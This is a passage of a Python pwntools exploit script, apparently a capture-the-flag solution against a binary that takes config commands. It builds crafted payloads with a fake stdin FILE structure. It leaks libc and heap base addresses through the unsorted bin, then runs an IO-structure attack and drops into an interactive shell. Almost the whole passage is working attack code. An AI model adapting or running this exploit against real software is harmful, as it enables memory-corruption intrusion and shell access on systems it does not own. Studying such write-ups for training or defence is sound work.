    content = p64(510)+p64(0)+p64(0)+p64(510)+p64(530)+p64(0)+p64(0)+p64(0)+p64(0)*20+p64(fake_stdin)
    configs.append(new_cfg(2, name, content, 0))
    # update the target
    # add another file ptr
    payload = b""
    payload += p32(1)
    payload += p32(0x41)
    payload += p32(len(configs))

    for each in configs:
        payload += each

    return payload

payload = config_leak_libc_unsorted()
ph.recvuntil("Enter command:")
ph.sendline(payload)
c1 = ph.recvuntil("Current Object Name:")
ph.recvuntil("Content: ")
libc_base = u64(ph.recvuntil("\n")[:-1].ljust(8,b'\x00'))
libc_base = libc_base-0x1ecbe0

ph.recvuntil("Enter command:")
payload = config_leak_heap_unsorted()
ph.sendline(payload)
c2 = ph.recvuntil("Current Object Name:")
ph.recvuntil("Content: ")
heap_base = u64(ph.recvuntil("\n")[:-1].ljust(8,b'\x00'))
heap_base = heap_base - 0x127f0

payload = config_exploit_IO(libc_base, heap_base)
ph.recvuntil("Enter command:")
ph.sendline(payload)

ph.recvuntil("Enter command:")
ph.sendline(b"T")
ph.interactive()
```

